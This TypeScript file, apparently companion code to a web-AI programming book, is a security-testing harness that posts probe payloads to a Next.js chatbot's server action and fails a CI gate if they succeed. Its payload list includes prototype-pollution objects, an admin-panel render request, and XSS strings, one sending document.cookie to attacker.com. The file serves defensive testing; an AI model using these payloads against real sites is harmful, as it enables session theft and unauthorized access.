/*
These sources are part of the "The Interplanetary Guide to Web AI" by Edgar Milvus.
You can find the series on Amazon.
New books info: https://linktr.ee/edgarmilvus

MIT License
Copyright (c) 2026 Edgar Milvus

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

// Source File: project_advanced_application_script.ts
// Description: Advanced Application Script
// ==========================================

import { createStreamableUI } from 'ai/rsc';
import { z } from 'zod';
import fetch from 'node-fetch';

/**
 * @fileoverview Automated Dynamic Pen-Testing Script for Streamable-UI & Server Actions.
 * This script simulates an advanced threat actor attempting to inject prototype pollution,
 * execute unauthorized component rendering, and bypass state boundaries within a Next.js
 * AI Chatbot Architecture leveraging the Vercel AI SDK.
 */

// Define the schema for the target Server Action payload
const SecurityTestPayloadSchema = z.object({
  actionId: z.string(),
  aiState: z.record(z.any()),
  clientInput: z.string(),
});

type SecurityTestPayload = z.infer<typeof SecurityTestPayloadSchema>;

/**
 * Configuration interface for the dynamic pen-testing pipeline harness.
 */
interface PenTestConfig {
  targetUrl: string;
  authToken: string;
  concurrencyLimit: number;
  fuzzingVectorsPath: string;
}

/**
 * Represents the structured result of an automated security probe against a streamable UI endpoint.
 */
interface SecurityProbeResult {
  vectorId: string;
  payload: unknown;
  httpStatus: number;
  responseBody: string;
  vulnerabilityDetected: boolean;
  vectorClassification: 'XSS' | 'PROTOTYPE_POLLUTION' | 'UNAUTHORIZED_RSC' | 'SAFE';
}

/**
 * Main execution harness for dynamic application security testing (DAST) of streamable-ui pipelines.
 */
class StreamableUISecurityHarness {
  private config: PenTestConfig;
  private maliciousPayloads: Array<{ id: string; type: SecurityProbeResult['vectorClassification']; payload: any }>;

  constructor(config: PenTestConfig) {
    this.config = config;
    this.maliciousPayloads = [
      {
        id: 'PAYLOAD-001',
        type: 'PROTOTYPE_POLLUTION',
        payload: {
          __proto__: { polluted: true },
          constructor: { prototype: { adminBypass: true } },
        },
      },
      {
        id: 'PAYLOAD-002',
        type: 'UNAUTHORIZED_RSC',
        payload: {
          uiComponent: 'AdminControlPanel',
          renderDirectives: { bypassAuth: true, targetUserId: 'root' },
        },
      },
      {
        id: 'PAYLOAD-003',
        type: 'XSS',
        payload: {
          userInput: '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
          streamableHtml: '<img src=x onerror=alert(1)>',
        },
      },
    ];
  }

  /**
   * Initializes the security test suite against the target Next.js server action.
   */
  public async runPipeline(): Promise<SecurityProbeResult[]> {
    console.log(`[DAST-Pipeline] Initializing security tests against target: ${this.config.targetUrl}`);
    const results: SecurityProbeResult[] = [];

    for (const vector of this.maliciousPayloads) {
      console.log(`[DAST-Pipeline] Executing probe ${vector.id} [Classification: ${vector.type}]...`);
      const result = await this.dispatchProbe(vector.id, vector.type, vector.payload);
      results.push(result);
    }

    this.evaluateResults(results);
    return results;
  }

  /**
   * Dispatches a single dynamic security probe targeting a Server Action endpoint.
   * 
   * @param vectorId Unique identifier for the fuzzing vector.
   * @param classification The category of the security vulnerability being tested.
   * @param payload The constructed exploit payload targeting the AIState or UIState.
   */
  private async dispatchProbe(
    vectorId: string,
    classification: SecurityProbeResult['vectorClassification'],
    payload: any
  ): Promise<SecurityProbeResult> {
    const endpoint = `${this.config.targetUrl}/_next/server-action`;
    
    // Construct a cryptographically framed request simulating a valid client session
    const requestBody: SecurityTestPayload = {
      actionId: 'mock-ai-chat-server-action-hash',
      aiState: {
        messages: [
          { role: 'user', content: JSON.stringify(payload) }
        ],
        uiStateSnapshot: {
          activeComponent: 'ChatWindow',
          restrictedAccess: false,
        },
      },
      clientInput: 'Run diagnostic routine.',
    };

    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${this.config.authToken}`,
          'Next-Action': 'mock-ai-chat-server-action-hash',
          'Accept': 'text/x-component', // Requesting React Server Component stream format
        },
        body: JSON.stringify(requestBody),
      });

      const responseBody = await response.text();
      const vulnerabilityDetected = this.analyzeResponse(classification, response.status, responseBody);

      return {
        vectorId,
        payload,
        httpStatus: response.status,
        responseBody: responseBody.substring(0, 500), // Truncate for logging hygiene
        vulnerabilityDetected,
        vectorClassification: classification,
      };
    } catch (error: any) {
      console.error(`[DAST-Pipeline] Probe ${vectorId} failed to execute network transport:`, error.message);
      return {
        vectorId,
        payload,
        httpStatus: 500,
        responseBody: error.message,
        vulnerabilityDetected: false,
        vectorClassification: classification,
      };
    }
  }

  /**
   * Analyzes the HTTP response stream from a Next.js Server Action to determine 
   * if the application successfully mitigated the security probe.
   */
  private analyzeResponse(classification: SecurityProbeResult['vectorClassification'], status: number, body: string): boolean {
    // If the server errors out safely (e.g., 400 Bad Request, 403 Forbidden, 500 with sanitized stack), 
    // the mitigation was successful.
    if (status === 401 || status === 403 || status === 400) {
      return false;
    }

    switch (classification) {
      case 'PROTOTYPE_POLLUTION':
        // Check if the response leaks or processes the polluted prototype properties
        return body.includes('polluted') || body.includes('adminBypass');
      
      case 'UNAUTHORIZED_RSC':
        // Check if the stream successfully rendered the restricted component
        return body.includes('AdminControlPanel') || body.includes('root');
      
      case 'XSS':
        // Check if unescaped script tags or dangerous event handlers were reflected in the streamable UI output
        return body.includes('<script>') || body.includes('onerror=alert');
      
      default:
        return false;
    }
  }

  /**
   * Evaluates the aggregated probe results and determines if the CI/CD deployment gate should fail.
   */
  private evaluateResults(results: SecurityProbeResult[]): void {
    const vulnerabilities = results.filter((r) => r.vulnerabilityDetected);
    
    if (vulnerabilities.length > 0) {
      console.error(`\n[SECURITY GATE FAILED] Detected ${vulnerabilities.length} active vulnerabilities in streamable-ui pipeline!`);
      vulnerabilities.forEach((v) => {
        console.error(` - Vector [${v.vectorId}] Classification (${v.vectorClassification}) successfully compromised the application state.`);
      });
      process.exit(1);
    } else {
      console.log('\n[SECURITY GATE PASSED] All streamable-ui security probes were successfully mitigated.');
    }
  }
}

// Execute the harness if invoked directly from the CLI pipeline
if (require.main === module) {
  const config: PenTestConfig = {
    targetUrl: process.env.PREVIEW_APP_URL || 'http://localhost:3000',
    authToken: process.env.TEST_AUTH_TOKEN || 'mock-jwt-token',
    concurrencyLimit: 5,
    fuzzingVectorsPath: './config/fuzzing-vectors.json',
  };

  const harness = new StreamableUISecurityHarness(config);
  harness.runPipeline().catch((err) => {
    console.error('[DAST-Pipeline] Fatal execution error:', err);
    process.exit(1);
  });
}
